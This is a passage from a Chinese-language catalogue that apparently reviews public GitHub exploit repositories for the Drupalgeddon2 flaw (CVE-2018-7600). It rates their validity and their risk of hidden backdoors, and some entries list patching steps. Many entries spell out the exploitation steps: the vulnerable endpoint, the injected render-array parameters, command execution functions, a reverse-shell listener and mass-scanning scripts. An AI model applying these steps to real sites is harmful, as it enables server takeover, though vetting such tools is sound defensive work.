**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
